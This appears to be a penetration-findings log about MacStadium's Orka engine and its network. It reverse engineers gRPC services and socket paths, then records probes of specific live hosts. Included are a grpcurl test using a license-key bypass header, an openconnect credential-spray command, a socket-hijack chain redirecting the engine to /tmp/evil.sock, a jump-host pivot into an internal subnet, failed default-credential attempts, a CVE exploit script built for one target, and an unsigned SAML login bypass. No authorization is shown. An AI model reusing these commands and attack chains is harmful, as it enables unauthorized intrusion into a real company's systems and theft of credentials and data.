ImageCopy(ImageCopyRequest)               → Google_Protobuf_Empty
ImageDelete(ImageDeleteRequest)           → Google_Protobuf_Empty
ImageDownloadLatestIPSW(Empty)            → ImageDownloadLatestIPSWResponse
ImageList(Empty)                          → ImageListResponse         ← TAKES EMPTY
ImagePull(ImagePullRequest)               → ImagePullResponse
ImagePush(ImagePushRequest)               → ImagePushResponse
```

**SystemService (1 RPC):**
```
[unknown method](Google_Protobuf_Empty)   → Google_Protobuf_Empty
```
Source: `SystemProvider.swift`. Method name not resolved — single Empty→Empty handler.

**VirtualMachineRegistrationService (1 RPC):**
```
Register(VirtualMachineRegisterRequest)   → Google_Protobuf_Empty
```
Source: `VirtualMachineRegistrationProvider.swift`. VMs call this on boot to announce to engine.  
"received callback from VM" log string. Engine uses `SystemServiceClient` after registration.

**RunVZService (5 RPCs — per-VM run.sock, engine→runvz):**
```
/RunVZService/Console   → VM console access
/RunVZService/Info      → VM state query
/RunVZService/Repartition → destructive disk repartition (F98)
/RunVZService/Restart   → VM restart
/RunVZService/Stop      → VM stop
```

**Critical observation:** `ImageList` and `ImageDownloadLatestIPSW` take `Google_Protobuf_Empty` as input. An attacker with socket access can list all images (`ImageList`) by sending a zero-byte protobuf body — no knowledge of schema required. Similarly trigger an IPSW download from Apple CDN.


---

## F109 — runvz P-256 key: ephemeral TLS, not image signing

Binary: `com.macstadium.orka-engine.runvz`
The P-256 ECDSA key is the TLS private key for mutual TLS on `run.sock` (engine↔runvz gRPC channel). Generated at runtime; not hardcoded; not keychain-stored. Used via `NIOSSLCustomPrivateKey` → `NIOSSLPrivateKeySource`. No application-level image-layer signing found.

Implication: the `run.sock` channel uses mTLS — a process that holds the engine's TLS cert can impersonate the engine to runvz. The cert material is what we need, not a hardcoded key.

## F110 — runvz: full Virtualization.framework surface (34 VZ classes)

Full VZ class inventory used by runvz:
```
VZBridgedNetworkDeviceAttachment      VZBridgedNetworkInterface
VZDirectorySharingDeviceConfiguration VZDiskImageStorageDeviceAttachment
VZEntropyDeviceConfiguration          VZFileHandleSerialPortAttachment
VZGraphicsDeviceConfiguration         VZKeyboardConfiguration
VZMACAddress                          VZMacAuxiliaryStorage
VZMacGraphicsDeviceConfiguration      VZMacGraphicsDisplayConfiguration
VZMacHardwareModel                    VZMacMachineIdentifier
VZMacOSBootLoader                     VZMacOSInstaller
VZMacOSRestoreImage                   VZMacOSVirtualMachineStartOptions
VZMacPlatformConfiguration            VZNATNetworkDeviceAttachment
VZNetworkDeviceConfiguration          VZPointingDeviceConfiguration
VZSerialPortConfiguration             VZSharedDirectory
VZSingleDirectoryShare                VZStorageDeviceConfiguration
VZUSBKeyboardConfiguration            VZUSBScreenCoordinatePointingDeviceConfiguration
VZVirtioBlockDeviceConfiguration      VZVirtioConsoleDeviceSerialPortConfiguration
VZVirtioEntropyDeviceConfiguration    VZVirtioFileSystemDeviceConfiguration
VZVirtioNetworkDeviceConfiguration    VZVirtualMachine
VZVirtualMachineConfiguration         VZVirtualMachineView
```

Notable: `VZVirtualMachineView` = GUI mode present in runvz (headless server binary with live AppKit view code). `VZBridgedNetworkDeviceAttachment` = bridged networking (full L2 bridge to host NIC, not just NAT). `VZMacOSInstaller` + `VZMacOSRestoreImage` = IPSW install path (`Install` RPC on engine socket drives this).

## F111 — Third OCI media type: metadata blob

Previously two media types were known. Third confirmed:
- `application/vnd.macstadium.orka-engine.metadata.v1+json`
This is a JSON metadata blob in the OCI manifest alongside the disk layer blobs. Likely carries VM config (CPU, memory, disk-size, identifiers). Every pulled image has this blob in addition to disk layers.

## F112 — Serial channel: 5 action types (bidirectional)

`OrkaEngineCore/SerialPortConfigurator.swift` handles 5 distinct message types on `/dev/tty.virtio`:
- `clipboard_init` — initial clipboard sync on VM start
- `clipboard` — clipboard read/write (F93: injection via this)
- `vm_initialize` — VM init signal from engine to VM
- `metadata` — metadata delivery from engine to VM
- `repartition` — disk resize trigger (engine→VM→engine callback loop)

The `Repartition` RPC on the engine socket flows DOWN the serial channel to the VM, which calls BACK UP to the engine. Bidirectional protocol. `repartition` message from a compromised VM to the serial port could trigger an engine-side disk operation.

## F113 — bv41 decode pipeline: output lands in disk.img + disk-aux.img

`extractArchive(at:to:)` → `moveExtractedArchiveFiles(from:to:)` decode bv41 layers into:
- `disk.img` — primary VM disk
- `disk-aux.img` — auxiliary storage (T2-equivalent, holds NVRAM etc)

Both filenames are string literals in the binary. Crafted bv41 layer → overwrite disk.img sectors via the overlap injection vector (F100).

## F114 — Cisco ASA tunnel-group confirmed: "Cisco AnyConnect VPN"

Source: `https://207.254.35.12/+CSCOE+/logon.html` — single group exposed.
Cookie format: `tg=1Q2lzY28gQW55Q29ubmVjdCBWUE4=` (base64 of group name).
ASDM port 8443: closed externally.
Credential spray path: `openconnect --cookieonly --authgroup="Cisco AnyConnect VPN" 207.254.35.12`.

## F115 — SystemService method name CONFIRMED: "Ping" / gRPC path /SystemService/Ping

**Severity:** INFO (completes proto reconstruction F99/F108)

**serviceName confirmed — "SystemService"**
- Symbol: `_$s16OrkaEngineServer14SystemProviderC4GRPC011CallHandlerE0AadEP11serviceNameSsvgTW`
- VA: 0x1005c1a78 / file 0x5c1a78
- Swift small string inline encoding:
  ```
  mov x1, #0x7953      ; bytes 53 79 = "Sy"
  movk x1, #0x7473, lsl #16  ; + "st"
  movk x1, #0x6d65, lsl #32  ; + "em"
  movk x1, #0x6553, lsl #48  ; + "Se"
  mov x2, #0x7672      ; bytes 72 76 = "rv"
  movk x2, #0x6369, lsl #16  ; + "ic"
  movk x2, #0x65, lsl #32    ; + "e"
  movk x2, #0xed00, lsl #48  ; tag: 0xed, bottom nibble = 0xd = 13 = len("SystemService")
  ```
- x1 LE bytes: 53 79 73 74 65 6d 53 65 = "SystemSe"
- x2 low bytes: 72 76 69 63 65 = "rvice"
- Full string: "SystemService" (13 chars) ✓

**method name confirmed — "Ping"**
- Handle dispatch in `SystemServiceAsyncProviderPAAE6handle` at VA 0x1005bfe58
- Compares incoming `method` string to "Ping":
  ```
  mov w0, #0x6950      ; bytes 50 69 = "Pi"
  movk w0, #0x676e, lsl #16  ; + "ng"
  mov x1, #-0x1c00000000000000  ; Swift small string tag, len=4
  bl 0x1003e7ab4       ; Swift.String equality
  tbz w0, #0, 0x1005bff2c  ; if NOT equal → return nil (no match)
  ```
- w0 LE bytes: 50 69 6e 67 = "Ping" ✓
- tag -0x1c00000000000000 = 0xe400000000000000; high byte 0xe4, bottom nibble = 4 = len("Ping") ✓

**Complete confirmed gRPC path:** `/SystemService/Ping`

**Proto updated:** `orka-engine-api.proto` SystemService comment updated from SPECULATIVE to CONFIRMED.

**ContextProvider / MetadataProvider (false lead closed):**
- "ContextProvider" in binary = `GRPC.AsyncServerCallContextProvider` (gRPC-Swift framework protocol)
- "MetadataProvider" in binary = `Logging.Logger.MetadataProvider` (swift-log framework type)
- NOT new Orka gRPC service providers; no new attack surface.

## F116 — Per-VM run.sock path formula CONFIRMED

**Severity:** HIGH (required for F101 exploit chain + dir permission assessment)

**VMBundle socket filename:**
- `VMBundle.socketFileName` getter at VA 0x100553124
- Swift small string encoding:
  ```
  mov  x0, #0x7572   ; bytes 72 75 = "ru"
  movk x0, #0x2e6e, lsl #16  ; + "n."
  movk x0, #0x6f73, lsl #32  ; + "so"
  movk x0, #0x6b63, lsl #48  ; + "ck"
  mov  x1, #-0x1800000000000000  ; tag 0xe8, len=8
  ```
- x0 LE: 72 75 6e 2e 73 6f 63 6b = **"run.sock"** ✓

**Path construction:**
- `VMUtil.getSocketPath(vmName: String) -> String` at VA 0x1005692e4
  - Immediately branches to specialized version at VA 0x10056b250
- `VMUtil.getExistingSocketPath(vmName: String) throws -> String` at VA 0x1005692d0
  - Calls 0x10056b7f8 (throws FileNotFoundError if socket absent)

**GlobalConfig.init path derivation (VA 0x1004f5238):**
- Builds "share" inline (0x1004f54b4): x8=0x6873+0x617200+0x65000000 → "share" (5 chars, len tag -0x1b..)
- Reads `XDG_DATA_HOME` env var inline (0x1004f55b4): "XDG_DATA" (x0) + "_HOME" (x1, tag 0xed len=13)
- If set: orkaDirURL = `$XDG_DATA_HOME/orka`
- Fallback: orkaDirURL = `~/.local/share/orka` (XDG Base Directory convention, used even on macOS)

**Full socket path formula:**
```
$XDG_DATA_HOME/orka/run/<vm_name>/run.sock
    — or —
~/.local/share/orka/run/<vm_name>/run.sock   (default, engine runs as LaunchAgent user)
```

**LaunchAgent context:** engine runs as the logged-in user (not root). On a MacStadium node, likely:
`/Users/<node_user>/.local/share/orka/run/<vm_name>/run.sock`

**Security implication:**
- Per-VM sockets live in user's home dir, not /var/run — no root required to create/delete them
- Any process running as the same user can access these sockets (no additional permissions gate)
- From F106: with license key bypass, engine creates/connects to per-VM sockets → enumerate live VMs

---

## F117 — Register handler sanitization: '/' checked, '..' NOT checked (PLAUSIBLE path traversal)

**Severity:** MEDIUM (requires engine socket access; F106 already provides full bypass)

**Location:** `VirtualMachineRegistrationProvider.receive(_:context:)` at VA ~0x1005bf174
**Source file:** `OrkaEngineServer/VirtualMachineRegistrationProvider.swift` (confirmed from cstring at 0x1008fe000+0xa80)

**What Register does (confirmed from disasm):**
1. Logs "received callback from VM <vm_name>" (cstring at VA 0x1008feac0)
2. Checks if vm_name contains '/' via `bl 0x10018915c` with char 0x2f
3. `tbz w1, #0, 0x1005bf2f8` — if '/' present, takes error branch (sets socket path = "n/a")
4. If no '/', proceeds to build socket path with vm_name

**Missing check: '..'**
- The Register handler checks for '/' but NOT for '..' path traversal sequences
- vm_name = ".." passes the check; `URL.appendingPathComponent("..")` navigates UP a directory
- With vm_name = "..", constructed path: `<runDirURL>/../run.sock` = `<orkaDirURL>/run.sock`
- With vm_name = "../..", path exits orkaDirURL entirely

**Exploitability constraints:**
- REQUIRES engine socket access (needs F106 bypass or direct host access)
- Whether vm_name from Register RPC feeds VMUtil.getSocketPath() OR a pre-stored registry path
  is NOT yet confirmed from static RE alone — `blr x9` at 0x1005bf3ac dispatches into vtable
- If engine re-derives socket path from Register vm_name → path traversal CONFIRMED
- If engine uses pre-stored path (set at VM launch) → Register vm_name is for lookup only → path traversal NOT applicable here, but spoofing still possible (arbitrary vm_name triggers registration event for another VM)

**Verification needed (live):** Connect to engine socket with F106 bypass → send
`Register(vm_name="..", source_name="x")` → observe which socket path engine subsequently uses
for RunVZService operations against that "VM"

---

## F118 — ORKA_ENGINE_SOCK env var overrides main engine socket path (GlobalConfig.init)

**Severity:** INFO (mechanism discovery; attack surface expansion if env var is attacker-writable)

**Location:** `GlobalConfig.init` at VA 0x1004f5a60–0x1004f5b7c (disasm confirmed 2026-08-15)

**What it does:**
1. Looks up `ORKA_ENGINE_SOCK` env var via `bl 0x10000ba2c` (getenv) at VA 0x1004f5a80
2. If set: uses env var value directly as `GlobalConfig.socketPath`
3. If not set: derives `socketPath = runDirURL + "/engine.sock"` = `$XDG_DATA_HOME/orka/run/engine.sock`

**The known `/var/run/orka-engine.sock` path is injected by the LaunchAgent plist**, not hardcoded
in the binary. The binary's default (without env var) is `~/.local/share/orka/run/engine.sock`.

**GlobalConfig ivar map (all confirmed from 0x100b5e000 offsets in init):**

| Offset | Ivar | Path component | Built from |
|--------|------|----------------|-----------|
| `0xa08` | `tmpDirURL`   | `<orkaDirURL>/tmp`         | "tmp" (3c, VA 0x1004f58dc) |
| `0xa10` | (pending)     | `<tmpDirURL>/...`          | next component after tmp store |
| `0xa18` | `runDirURL`   | `<orkaDirURL>/run`         | "run" (3c, VA 0x1004f5970) |
| `0xa30` | `socketPath`  | `$ORKA_ENGINE_SOCK` or `<runDirURL>/engine.sock` | env var or append |

**runDirURL CONFIRMED:** `0x100b5e000 + 0xa18` offset. Path = `$XDG_DATA_HOME/orka/run` or
`~/.local/share/orka/run` (default).

**Per-VM socket path formula (F116 now fully confirmed):**
```
<runDirURL>/<vm_name>/run.sock
  = $XDG_DATA_HOME/orka/run/<vm_name>/run.sock
  = ~/.local/share/orka/run/<vm_name>/run.sock  (default)
```

**Security implication:**
- If an attacker can inject into the process environment before launch (e.g., LaunchAgent plist write
  from F104), setting `ORKA_ENGINE_SOCK` redirects the engine socket to an attacker-controlled path
- Engine would bind/listen on attacker's socket → MITM all gRPC traffic from orka3 CLI
- Chain: F104 (plist write) → inject `ORKA_ENGINE_SOCK=/tmp/evil.sock` → MITM engine socket → steal JWT/commands


---

## F119 -- VirtualMachineProvider: two of three getSocketPath callers have NO vm_name sanitization (PLAUSIBLE path traversal)

**Severity:** HIGH (path traversal before socket connect; engine socket access required -- F106 bypass sufficient)

**Location:** `OrkaEngineServer/VirtualMachineProvider.swift` -- confirmed via source cstring at VA 0x1005b535c, 0x1005b5900, 0x1005b5d54

**Context:** `VMUtil.getSocketPath(vm_name)` has exactly 3 call sites in VirtualMachineProvider.swift. Two have no sanitization.

| Site | VA | Func start | '/' check before call? | Identified as |
|------|-----|------------|------------------------|---------------|
| 1 | 0x1005b516c | 0x1005b4e9c | NO | Start handler (string " is currently running" at 0x1005b5048) |
| 2 | 0x1005b5710 | 0x1005b56b0 | NO | unknown handler (VirtualMachineProvider.swift) |
| 3 | 0x1005b5b64 | ~0x1005b5b00 | YES (0x1005b59a4, 0x1c0 bytes before) | has sanitization |

**Contrast with Register handler (F117):**
- Register at 0x1005bf174 DOES check '/' but NEVER calls getSocketPath
- VirtualMachineProvider Sites 1 and 2 do NOT check '/' but DO call getSocketPath directly

**Attack path:**
```
VirtualMachineService.Start(vm_name="..") [with F106 bypass]
  --> vm_name loaded from request [x22, #0xa0]
  --> VMUtil.getSocketPath("..") called directly, no sanitization
  --> Foundation URL.appendingPathComponent("..") = <runDirURL>/../run.sock = <orkaDirURL>/run.sock
  --> engine connects to wrong socket (path traversal)
```

**Deeper traversal:**
- vm_name = "../../tmp/evil" -> socket path exits runDirURL entirely
- If attacker creates /tmp/evil/run.sock -> MITM engine-to-runvz gRPC channel

**Foundation URL confirmed behavior:** `.appendingPathComponent("..")` does NOT normalize; `.standardized`/`.resolvingSymlinksInPath` not called in getSocketPath.

**Live test:**
```
grpcurl -plaintext -H "ORKA_ENGINE_LICENSE_KEY: 90ECE379-E9F0-4393-BC58-64FD7F078F7E" \
  -d '{"vm_name":".."}' \
  -unix /var/run/orka-engine.sock \
  VirtualMachineService/Start
```
Observe: which socket path does engine attempt to connect?

**Revised F117:** Register checks '/' but never calls getSocketPath -> spoofing risk only. Path traversal surface is F119 (VirtualMachineProvider Start and one other handler).

**CORRECTION (same-session addendum):** Sites 1 and 2 are NOT the Start handler.
- Site 1 func (0x1005b4e9c): cstring `delete(request:context:)` at 0x1005b5480 + `OrkaEngineServer/VirtualMachineProvider.swift` at 0x1005b535c -> **Delete handler**
- Site 2 func (0x1005b56b0): cstring `delete(request:context:)` at 0x1005b5a24 + same source -> **Delete handler continuation (Swift async resumption thunk)**
- Site 3 (0x1005b5b64): also Delete handler; this path HAS the '/' check at 0x1005b59a4

**Interpretation:** The Delete RPC generates multiple Swift async continuations. Two of three getSocketPath call sites in those continuations lack the '/' sanitization. One path is sanitized. vm_name=".." will hit one of the unsanitized paths depending on control flow.

**Attack vector (revised):** `VirtualMachineService.Delete(vm_name="..")` with F106 bypass -> engine traverses to `<orkaDirURL>/run.sock` to communicate with "that VM" before deletion -> path traversal confirmed if socket exists at that path, or engine errors with a path that leaks the runDirURL.

---

## F120 -- Full source map + CI build path embedded in binary

**Severity:** INFO (intelligence value; confirms monorepo structure + CI pipeline)

**Location:** Swift debug info embedded in com.macstadium.orka-engine.server

**Build path:** `/Users/devadmin/actions-runner/_work/monorepo-dev/monorepo-dev/packages/orka-engine/`

**Disclosures:**
- Build machine user: `devadmin`
- CI system: GitHub Actions Runner (path prefix: `actions-runner/_work`)
- Monorepo name: `monorepo-dev` (repeated twice in path -- GitHub Actions workspace convention)
- Package path within monorepo: `packages/orka-engine`
- `/Users/devadmin/` appears **1,991 times** in the binary (source refs + Swift package dependency paths)

**Complete OrkaEngineServer source file list (from embedded paths):**
```
OrkaEngineServer/Client/RunVZService.swift
OrkaEngineServer/ImageProvider.swift
OrkaEngineServer/LicenseCheckServerInterceptor.swift
OrkaEngineServer/Main.swift
OrkaEngineServer/OrkaEngineServer.swift
OrkaEngineServer/TracingServerInterceptor.swift
OrkaEngineServer/VirtualMachineProvider.swift
OrkaEngineServer/VirtualMachineRegistrationProvider.swift
```

**Security implication:**
- Confirms attack surfaces: `VirtualMachineProvider.swift` (external RPCs), `Client/RunVZService.swift` (per-VM socket client)
- `LicenseCheckServerInterceptor.swift` -- the license bypass interceptor confirmed by name (F106)
- `TracingServerInterceptor.swift` -- tracing/observability interceptor; may surface internal errors to trace backends

---

## F119 addendum -- Source file clarification

`getExistingSocketPath` callers at 0x1005a9e54 and 0x1005aeaf4 are in **`Client/RunVZService.swift`**
(the engine's gRPC client for RunVZ operations), NOT in a direct external RPC handler.

**Attack chain clarified:**
```
External:  VirtualMachineService.Delete(vm_name="..") or Stop(vm_name="..")
              [VirtualMachineProvider.swift -- calls RunVZService client]
                  RunVZService client [Client/RunVZService.swift]
                      getExistingSocketPath("..") -- no sanitization
                          URL path traversal -> wrong socket path
                              engine connects to attacker socket
```

**Internal /RunVZService/Stop path** at 0x1005aa744 confirms the engine uses this client
to send Stop/Console/other RunVZ operations to per-VM sockets.

The **VMUtil.getSocketPath** callers in `VirtualMachineProvider.swift` (F119, Sites 1+2, Delete handler)
are the direct path derivation points. The **RunVZService.swift** client adds a second
unsanitized path via getExistingSocketPath used when CONNECTING to existing VM sockets.

**Combined exposure: ALL socket-touching RPCs (Start, Stop, Delete, Console, Restart, Save) 
that derive vm socket path are potentially reachable without '..' sanitization, 
depending on which code path within each handler is taken.**

---

## F121 — vm_name Regex Validation: Delete Handler Protected, Register Handler Not

**Severity:** Informational (modifies F117/F119 severity)
**Category:** Input Validation Coverage Gap

**What:** The Delete handler validates vm_name against `[A-Za-z0-9][-_A-Za-z0-9]*[A-Za-z0-9]` before
dispatching to getSocketPath. The Register handler does NOT.

**Static evidence:**

Delete handler entry (VA 0x1005b4e9c):
- `mov x21, #0` at 0x1005b4ee0
- `bl 0x1005adf90` at 0x1005b4ee4   — validateAndError-B wrapper
- `cbnz x21, 0x1005b5118`           — throws if vm_name invalid
- Only proceeds to getSocketPath (Sites 1/2) if vm_name passes regex

validateAndError-B (0x1005adf90):
- `ldp x19, x22, [x0]`             — extract vm_name from request proto
- `bl 0x100568450` (validateVMName) — calls regex engine
- if invalid: logs "The vm name of '' is not valid; should follow the regex: [A-Za-z0-9][-_A-Za-z0-9]*[A-Za-z0-9]."
- throws error before reaching getSocketPath

validateVMName (0x100568450):
- Loads regex `[A-Za-z0-9][-_A-Za-z0-9]*[A-Za-z0-9]` from 0x1008fcc50
- `bl 0x10083b150` — NSRegularExpression match
- Returns Bool (1 = valid, 0 = invalid)
- Only ONE code reference to regex string (inside validateVMName)
- Three callers: 0x1005add50, 0x1005adfb8, 0x1005ae648

Register handler (VirtualMachineRegistrationProvider, 0x1005bf174):
- `bl 0x10018915c` at 0x1005bf2d4  — checks for '/' only
- No call to validateVMName (0x100568450) found in 0x200-byte scan
- vm_name=".." passes the '/' check → stored in RegistrationManager

**Impact on F119:**
- VirtualMachineService.Delete(vm_name="..") → BLOCKED by validateVMName at handler entry
- F119 path traversal via Delete is mitigated; severity reduced

**Impact on F117:**
- VirtualMachineRegistrationService.Register(vm_name="..") → '/' check passes
- ".." is stored in RegistrationManager
- If Stop/Console handlers retrieve vm_name from registry without revalidating → getExistingSocketPath("..") → path traversal
- Whether Stop/Console handlers call validateVMName: UNCONFIRMED (no BL callers of validateAndError-A or C found; may be inlined or async-dispatched)

**Attack chain (PLAUSIBLE, unverified):**
1. Connect to /var/run/orka-engine.sock (F106 bypass for auth)
2. Call VirtualMachineRegistrationService.Register(vm_name="..", source_name="x")
3. Call VirtualMachineService.Stop(vm_name="..") — if Stop skips regex check
4. Engine calls getExistingSocketPath("..") → getSocketPath-specialized("..")
5. Socket connect to traversal path

**Remediation:**
- Apply validateVMName in ALL handlers that accept vm_name, including Register
- Move validation into getSocketPath-specialized itself so no handler can bypass it

---

## F119 (REVISED) — Delete Handler Path Traversal: MITIGATED

**Revision:** validateVMName at Delete handler entry (VA 0x1005b4ee4) rejects vm_name=".."
(first char '.' not in [A-Za-z0-9]).

getSocketPath call Sites 1 and 2 in Delete handler CAN only be reached with regex-valid vm_names.
Valid names `[A-Za-z0-9][-_A-Za-z0-9]*[A-Za-z0-9]` contain no dots or slashes.

**Residual risk:** Path traversal surface shifts to Register handler (F117/F121) where validation is
absent. Exploitability depends on Stop/Console handler revalidation status (UNCONFIRMED).

**Severity revised:** LOW for Delete path specifically; MEDIUM residual via Register→Stop chain.

---

## F122 — getSocketPath-specialized HEX-ENCODES vm_name: Path Traversal Architecturally Prevented

**Severity:** INFO (closes F119/F121 traversal hypothesis; residual issues are logic bugs not security bugs)

**Location:** `VMUtil.getSocketPath-specialized` at VA 0x10056b250

**What the function does (fully reversed):**

```
getSocketPath-specialized(vmName: String) -> String:
    1. bl GlobalConfig.shared                          ; get runDirURL
    2. bl URL.appendingPathComponent(isDir:)           ; runDirURL URL step
    3. bl 0x1005410e8 (normalizeName)                  ; validate/normalize vm_name
       - validates against [A-Za-z0-9][-_A-Za-z0-9]*[A-Za-z0-9]
       - returns Swift String (normalized name bytes)
    4. hex-encoding loop (0x10056b578–0x10056b5fc):
       - ldrb w19, [x27, x22]                         ; load each byte of normalizeName result
       - construct "%02x" inline:
           mov  w0, #0x3025      ; bytes 25 30 = '%0'
           movk w0, #0x7832, lsl #16  ; bytes 32 78 = '2x'
           mov  x1, #-0x1c00000000000000  ; Swift small string tag len=4
           bl   0x10083bc3c      ; Swift String("%02x")
       - format each byte as 2-char hex string
       - collect into [String] array
    5. join hex strings → single hex string
    6. append ".sock" (5-byte Swift inline: 0x732e, 0x636f, 0x6b)
    7. bl URL.appendingPathComponent → final URL
    8. bl URL(fileURLWithPath:) → file URL
```

**Critical property:** The hex-encoding loop converts EVERY byte of vm_name to two ASCII hex digits.
For vm_name=".." (bytes [0x2e, 0x2e]) → hex string "2e2e" → socket path: `runDir/2e2e.sock`

The kernel receives `runDir/2e2e.sock` — NOT `runDir/../.sock`. No path component traversal occurs.

**Confirmed via:**
- `%02x` inline construction at 0x10056b5ac–0x10056b5b0 (only one `%02x` in entire binary: VA 0x1008db2bb)
- `ldrb w19, [x27, x22]` (byte-by-byte load at 0x10056b578) — processes raw bytes
- 0x10054006c called with normalizeName result: extracts bytes of the returned Swift String
- `stp x0, x1, [x8, #0x20]` at 0x10056b5d8: accumulates encoded strings into array

**Impact on prior findings:**

| Finding | Prior assessment | Revised assessment |
|---------|-----------------|-------------------|
| F119 | MEDIUM — path traversal via Delete/Stop | INFO — hex-encoding prevents traversal; ENOENT at most |
| F121 | MEDIUM — validation gap enables Stop traversal | INFO — gap exists, traversal impossible; no meaningful impact |
| F117 | MEDIUM — Register stores ".." without validation | INFO — even if Stop uses "..", path = `runDir/2e2e.sock` → ENOENT |

**What an attacker can actually do with vm_name="..":**
- Call Stop(vm_name="..") with F106 bypass → engine calls getSocketPath("..") → connects to `runDir/2e2e.sock`
- That socket does not exist (no VM named ".." was started) → ENOENT → engine returns an error
- No traversal, no escalation

**Remaining surface (unchanged):**
- F106 (license bypass): CRITICAL — grants access to all 20 RPCs
- F107 (unauth Console): HIGH — any process with Unix socket access can attach VM console
- F98 (Repartition destructive): HIGH — disk erasure via authorized RPC misuse
- F101 (runDirURL permissions): needs live verification — if `runDir/` is world-writable,
  attacker could pre-create `runDir/2e2e.sock` before a legitimate "2e2e" vm_name VM starts.
  This is now the actual residual socket-path risk (socket pre-creation/hijacking), not traversal.

---

## F123 — Internal 207.254.14.x Subnet Discovery

**Category:** Infrastructure Reconnaissance  
**Severity:** HIGH  
**Status:** CONFIRMED

**Finding:** The 207.254.14.x network is reachable via SOCKS5h through the 208.52.182.90 jump host and contains critical MacStadium infrastructure previously unknown.

**Components discovered:**

### Cisco APIC (SDN Controller) — 207.254.14.1
- Server: nginx/1.7.10 (embedded)
- API: Cisco ACI REST API at `/api/aaaLogin.json`
- Auth: Token-based (APIC-Cookie)
- Unauthenticated: `/api/aaaListDomains.json` → 200 (confirms APIC)
- CVE-2021-1219 applicable if pre-5.2(3n) — unauthenticated admin creation
- Script: `~/VDT/tools/ClaudeIP-max/apic_cve_2021_1219.py` (built for this target)

### VergeOS Cluster (Physical Hypervisor) — 207.254.14.4–.24
- Version: 26.0.2.2 (hash: be82ece927a7d6ee58e518280a36b23f43cda0ad)
- Server: gcweb 4.0
- 12 nodes confirmed: .4, .5, .6, .7, .8, .9, .10, .14, .16, .18, .22, .24
- Unauthenticated: `/version.json` → version disclosed
- API: `/api/v4/` requires Basic auth
- Default credentials tried: all failed
- VergeOS is the physical hypervisor BELOW Orka/k8s — controls VM lifecycle at the metal level

**Impact:** VergeOS access = full control over physical Mac hardware, all Orka VMs, disk images. APIC access = full ACI fabric control (VLANs, routing, endpoints).

---

## F124 — VPN SAML Tunnel Group Enumeration

**Category:** Authentication Bypass Surface  
**Severity:** MEDIUM  
**Status:** CONFIRMED

**Finding:** Tunnel group `SAML` exists on VPN endpoint 207.254.36.2.

- All other tunnel group names → `a0=115` (unknown group)
- `tgroup=SAML` → `a0=8` (auth_failed = valid group)
- SAML SP configured at this endpoint: `/+CSCOE+/saml/sp/metadata` → "SAML metadata doesn't exist for the group"
- **attack_condition=true**: no IdP metadata registered → no signature validation possible
- ACS endpoint at `/+CSCOE+/saml/sp/acs` — CSRF-gated, token extraction possible from logout page
- CSRF token example: `9c6a78150e62b40580304e93ceeba4b8ee2f2581`

**Attack chain (requires CSRF bypass):** POST unsigned SAMLResponse to ACS with correct CSRF token → ASA issues webvpn session cookie (no IdP cert to validate against)

---

## F125 — Harbor Public macOS VM Images

**Category:** Information Disclosure  
**Severity:** LOW  
**Status:** CONFIRMED

**Finding:** Harbor registry at 207.254.35.53 (`orkv10000076-01.oci.las1.macstadiumcloud.com`) exposes macOS VM base images in public `library` project without authentication.

**Images:**
- `library/generic-14-sonoma-arm:0.0.2` — 20.5 GB compressed, 96.6 GB full disk
- `library/generic-14-sonoma-arm:0.0.1` — 20.5 GB compressed
- `library/ventura-arm:latest` — 17.6 GB compressed
- `library/generic-15-sequoia-arm:0.0.1` — 22.8 GB compressed

**Access:** Manifest metadata readable without auth (OCI token exchange). Blob downloads redirect to internal S3 (`1.obj.las1.macstadiumcloud.com`) which is NXDOMAIN externally.

Media type: `application/vnd.macstadium.orka-engine.disk.layer.v1+lz4` — Orka's custom OCI format.

